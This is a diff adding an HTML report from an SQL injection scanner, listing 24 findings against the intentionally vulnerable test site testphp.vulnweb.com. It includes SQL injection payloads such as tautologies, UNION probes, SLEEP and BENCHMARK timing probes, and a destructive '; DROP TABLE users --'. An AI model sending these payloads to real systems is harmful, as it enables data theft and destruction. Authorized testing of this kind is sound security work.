@@ -1,0 +1,1069 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SQL Injection Scanner Report</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      line-height: 1.6;
+      color: #333;
+      background-color: #f8f9fa;
+      margin: 0;
+      padding: 20px;
+    }
+    
+    .container {
+      max-width: 1200px;
+      margin: 0 auto;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      overflow: hidden;
+    }
+    
+    .header {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      padding: 30px;
+      text-align: center;
+    }
+    
+    .header h1 {
+      font-size: 2.5em;
+      margin-bottom: 10px;
+      font-weight: 300;
+    }
+    
+    .header .subtitle {
+      font-size: 1.1em;
+      opacity: 0.9;
+    }
+    
+    .summary {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 20px;
+      padding: 30px;
+      background-color: #f8f9fa;
+    }
+    
+    .summary-card {
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      text-align: center;
+    }
+    
+    .summary-card .number {
+      font-size: 2.5em;
+      font-weight: bold;
+      color: #667eea;
+      margin-bottom: 5px;
+    }
+    
+    .summary-card .label {
+      color: #666;
+      font-size: 0.9em;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    
+    .content {
+      padding: 30px;
+    }
+    
+    .section {
+      margin-bottom: 40px;
+    }
+    
+    .section-title {
+      font-size: 1.8em;
+      color: #333;
+      margin-bottom: 20px;
+      padding-bottom: 10px;
+      border-bottom: 2px solid #667eea;
+    }
+    
+    .metadata {
+      background-color: #f8f9fa;
+      padding: 20px;
+      border-radius: 8px;
+      margin-bottom: 30px;
+    }
+    
+    .metadata ul {
+      list-style: none;
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 15px;
+    }
+    
+    .metadata li {
+      background: white;
+      padding: 10px 15px;
+      border-radius: 5px;
+      border-left: 4px solid #667eea;
+    }
+    
+    .metadata strong {
+      color: #667eea;
+    }
+    
+    .table-container {
+      overflow-x: auto;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    }
+    
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      background: white;
+    }
+    
+    th {
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      padding: 15px 10px;
+      text-align: left;
+      font-weight: 600;
+      font-size: 0.9em;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+    
+    td {
+      padding: 12px 10px;
+      border-bottom: 1px solid #eee;
+    }
+    
+    tbody tr:hover {
+      background-color: #f8f9fa;
+    }
+    
+    tbody tr:nth-child(even) {
+      background-color: #fdfdfd;
+    }
+    
+    .confidence {
+      font-weight: bold;
+      padding: 4px 8px;
+      border-radius: 12px;
+      color: white;
+      font-size: 0.85em;
+    }
+    
+    .confidence.high { background-color: #dc3545; }
+    .confidence.medium { background-color: #fd7e14; }
+    .confidence.low { background-color: #ffc107; color: #333; }
+    
+    .detection-type {
+      padding: 4px 8px;
+      border-radius: 12px;
+      font-size: 0.85em;
+      font-weight: 500;
+      text-transform: uppercase;
+    }
+    
+    .detection-type.error { background-color: #dc3545; color: white; }
+    .detection-type.time { background-color: #fd7e14; color: white; }
+    .detection-type.boolean { background-color: #198754; color: white; }
+    .detection-type.union { background-color: #6f42c1; color: white; }
+    
+    .payload {
+      font-family: 'Courier New', monospace;
+      background-color: #f1f3f4;
+      padding: 5px;
+      border-radius: 3px;
+      font-size: 0.85em;
+      max-width: 200px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+    
+    .evidence {
+      max-width: 300px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+      font-size: 0.9em;
+    }
+    
+    .footer {
+      background-color: #f8f9fa;
+      padding: 20px 30px;
+      text-align: center;
+      color: #666;
+      border-top: 1px solid #eee;
+    }
+    
+    .footer a {
+      color: #667eea;
+      text-decoration: none;
+    }
+    
+    .severity-critical { color: #dc3545; font-weight: bold; }
+    .severity-high { color: #fd7e14; font-weight: bold; }
+    .severity-medium { color: #ffc107; font-weight: bold; }
+    .severity-low { color: #198754; font-weight: bold; }
+    
+    @media (max-width: 768px) {
+      .summary {
+        grid-template-columns: 1fr;
+      }
+      
+      .metadata ul {
+        grid-template-columns: 1fr;
+      }
+      
+      table {
+        font-size: 0.85em;
+      }
+      
+      th, td {
+        padding: 8px 5px;
+      }
+    }
+    
+    .no-findings {
+      text-align: center;
+      padding: 60px 20px;
+      color: #666;
+    }
+    
+    .no-findings .icon {
+      font-size: 4em;
+      margin-bottom: 20px;
+      color: #198754;
+    }
+    
+    .vulnerability-count {
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+    }
+    
+    .count-badge {
+      background: #667eea;
+      color: white;
+      padding: 2px 8px;
+      border-radius: 10px;
+      font-size: 0.8em;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>SQL Injection Scanner Report</h1>
+      <div class="subtitle">Advanced Security Assessment Results</div>
+    </div>
+    
+    <div class="summary">
+      <div class="summary-card">
+        <div class="number">24</div>
+        <div class="label">Total Findings</div>
+      </div>
+      <div class="summary-card">
+        <div class="number">2025-07-28</div>
+        <div class="label">Scan Date</div>
+      </div>
+      <div class="summary-card">
+        <div class="number">24</div>
+        <div class="label">High Confidence</div>
+      </div>
+      <div class="summary-card">
+        <div class="number">1</div>
+        <div class="label">Attack Types</div>
+      </div>
+    </div>
+    
+    <div class="content">
+      
+      <div class="section">
+        <h2 class="section-title">Scan Configuration</h2>
+        <div class="metadata">
+          <ul>
+            
+            <li><strong>Scanner:</strong> 1.0.0</li>
+            
+            <li><strong>Generated:</strong> 2025-07-28T21:08:23Z</li>
+          </ul>
+        </div>
+      </div>
+      
+      
+      <div class="section">
+        <h2 class="section-title">
+          <span class="vulnerability-count">
+            Vulnerability Details
+            <span class="count-badge">24</span>
+          </span>
+        </h2>
+        
+        
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>#</th>
+                <th>Target URL</th>
+                <th>Parameter</th>
+                <th>Method</th>
+                <th>Attack Payload</th>
+                <th>Type</th>
+                <th>Confidence</th>
+                <th>Evidence</th>
+                <th>Time Δ</th>
+              </tr>
+            </thead>
+            <tbody>
+              
+              <tr>
+                <td>1</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/listproducts.php?cat=+OR+1%3D1
+                  </div>
+                </td>
+                <td><strong>cat</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    GET
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title=" OR 1=1"> OR 1=1</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>2</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/listproducts.php?cat=+OR+1%3D1+--
+                  </div>
+                </td>
+                <td><strong>cat</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    GET
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title=" OR 1=1 --"> OR 1=1 --</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>3</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/listproducts.php?cat=+OR+1%3D1+%2F%2A
+                  </div>
+                </td>
+                <td><strong>cat</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    GET
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title=" OR 1=1 /*"> OR 1=1 /*</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>4</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/listproducts.php?cat=+UNION+SELECT+NULL
+                  </div>
+                </td>
+                <td><strong>cat</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    GET
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title=" UNION SELECT NULL"> UNION SELECT NULL</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>5</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/listproducts.php?cat=+AND+1%3D2
+                  </div>
+                </td>
+                <td><strong>cat</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    GET
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title=" AND 1=2"> AND 1=2</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>6</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/listproducts.php?cat=+OR+SLEEP%285%29
+                  </div>
+                </td>
+                <td><strong>cat</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    GET
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title=" OR SLEEP(5)"> OR SLEEP(5)</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>7</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/listproducts.php?cat=+OR+1%3D1+AND+2%3D2
+                  </div>
+                </td>
+                <td><strong>cat</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    GET
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title=" OR 1=1 AND 2=2"> OR 1=1 AND 2=2</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>8</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/listproducts.php?cat=+%2A+1+OR+1%3D1
+                  </div>
+                </td>
+                <td><strong>cat</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    GET
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title=" * 1 OR 1=1"> * 1 OR 1=1</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>9</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/listproducts.php?cat=+DIV+1+UNION+SELECT+NULL
+                  </div>
+                </td>
+                <td><strong>cat</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    GET
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title=" DIV 1 UNION SELECT NULL"> DIV 1 UNION SELECT NULL</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>10</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/listproducts.php?cat=+OR+BENCHMARK%285000000%2CMD5%281%29%29
+                  </div>
+                </td>
+                <td><strong>cat</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    GET
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title=" OR BENCHMARK(5000000,MD5(1))"> OR BENCHMARK(5000000,MD5(1))</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>11</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/listproducts.php?cat=+OR+2-1%3D1
+                  </div>
+                </td>
+                <td><strong>cat</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    GET
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title=" OR 2-1=1"> OR 2-1=1</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>12</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/listproducts.php?cat=+OR+2-1%3D1+--
+                  </div>
+                </td>
+                <td><strong>cat</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    GET
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title=" OR 2-1=1 --"> OR 2-1=1 --</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>13</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/listproducts.php?cat=+OR+2-1%3D1+%2F%2A
+                  </div>
+                </td>
+                <td><strong>cat</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    GET
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title=" OR 2-1=1 /*"> OR 2-1=1 /*</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>14</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/listproducts.php?cat=+OR+%28CASE+WHEN+1%3D1+THEN+1+ELSE+0+END%29%3D1
+                  </div>
+                </td>
+                <td><strong>cat</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    GET
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title=" OR (CASE WHEN 1=1 THEN 1 ELSE 0 END)=1"> OR (CASE WHEN 1=1 THEN 1 ELSE 0 END)=1</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>15</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/listproducts.php?cat=+OR+%28CASE+WHEN+1%3D1+THEN+1+ELSE+0+END%29%3D1+--
+                  </div>
+                </td>
+                <td><strong>cat</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    GET
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title=" OR (CASE WHEN 1=1 THEN 1 ELSE 0 END)=1 --"> OR (CASE WHEN 1=1 THEN 1 ELSE 0 END)=1 --</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>16</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/listproducts.php?cat=+OR+%28CASE+WHEN+1%3D1+THEN+1+ELSE+0+END%29%3D1+%2F%2A
+                  </div>
+                </td>
+                <td><strong>cat</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    GET
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title=" OR (CASE WHEN 1=1 THEN 1 ELSE 0 END)=1 /*"> OR (CASE WHEN 1=1 THEN 1 ELSE 0 END)=1 /*</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>17</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/listproducts.php?cat=+OR+%271%27%3D%271
+                  </div>
+                </td>
+                <td><strong>cat</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    GET
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title=" OR &#39;1&#39;=&#39;1"> OR &#39;1&#39;=&#39;1</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>18</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/listproducts.php?cat=+OR+%221%22%3D%221
+                  </div>
+                </td>
+                <td><strong>cat</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    GET
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title=" OR &#34;1&#34;=&#34;1"> OR &#34;1&#34;=&#34;1</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>19</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/listproducts.php?cat=+OR+%27a%27%3D%27a
+                  </div>
+                </td>
+                <td><strong>cat</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    GET
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title=" OR &#39;a&#39;=&#39;a"> OR &#39;a&#39;=&#39;a</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>20</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/search.php?test=query
+                  </div>
+                </td>
+                <td><strong>searchFor</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    POST
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title="&#39; OR &#39;1&#39;=&#39;1&#39; --">&#39; OR &#39;1&#39;=&#39;1&#39; --</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>21</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/search.php?test=query
+                  </div>
+                </td>
+                <td><strong>searchFor</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    POST
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title="&#39; OR &#39;1&#39;=&#39;1&#39; /*">&#39; OR &#39;1&#39;=&#39;1&#39; /*</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>22</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/search.php?test=query
+                  </div>
+                </td>
+                <td><strong>searchFor</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    POST
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title="&#39; UNION SELECT NULL --">&#39; UNION SELECT NULL --</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>23</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/search.php?test=query
+                  </div>
+                </td>
+                <td><strong>searchFor</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    POST
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title="&#39;; DROP TABLE users --">&#39;; DROP TABLE users --</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+              <tr>
+                <td>24</td>
+                <td>
+                  <div style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                    http://testphp.vulnweb.com/search.php?test=query
+                  </div>
+                </td>
+                <td><strong>searchFor</strong></td>
+                <td>
+                  <span style="background: #6c757d; color: white; padding: 2px 6px; border-radius: 3px; font-size: 0.8em;">
+                    POST
+                  </span>
+                </td>
+                <td>
+                  <div class="payload" title="&#39; || &#39;1&#39;=&#39;1&#39; --">&#39; || &#39;1&#39;=&#39;1&#39; --</div>
+                </td>
+                <td>
+                  <span class="detection-type error">error</span>
+                </td>
+                <td>
+                  <span class="confidence high">
+                    90%
+                  </span>
+                </td>
+                <td>
+                  <div class="evidence" title="MySQL error: you have an error in your sql syntax...">MySQL error: you have an error in your sql syntax...</div>
+                </td>
+                <td>0.00s</td>
+              </tr>
+              
+            </tbody>
+          </table>
+        </div>
+        
+      </div>
+    </div>
+    
+    <div class="footer">
+      <p>Report generated by <a href="#">SQL Injection Scanner</a> • 2025-07-28T21:08:23Z</p>
+      <p style="margin-top: 10px; font-size: 0.9em;">
+        <strong>Disclaimer:</strong> This tool is for authorized security testing only. 
+        Use only on applications you own or have explicit permission to test.
+      </p>
+    </div>
+  </div>
+</body>
+</html>
